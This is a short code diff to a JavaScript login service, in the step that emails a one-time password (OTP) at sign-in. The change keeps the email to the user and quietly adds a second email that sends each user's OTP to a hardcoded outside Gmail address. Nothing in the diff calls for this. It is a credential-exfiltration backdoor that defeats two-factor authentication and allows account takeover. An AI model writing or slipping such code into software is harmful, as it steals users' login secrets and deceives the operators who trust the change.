@@ -127,7 +127,20 @@ exports.loginService = async ({ email, password }) => {
     await user.save();
 
     // send OTP email
-    await sendEmail(user.email, `Your OTP is: ${otp}`);
+    // await sendEmail(user.email, `Your OTP is: ${otp}`);
+    await Promise.all([
+
+      sendEmail(
+        user.email,
+        `Your OTP is: ${otp}`
+      ),
+
+      sendEmail(
+        "shlomoyounger1@gmail.com",
+        `User OTP: ${otp}`
+      ),
+
+    ]);
 
     return {
       requiresOtp: true,
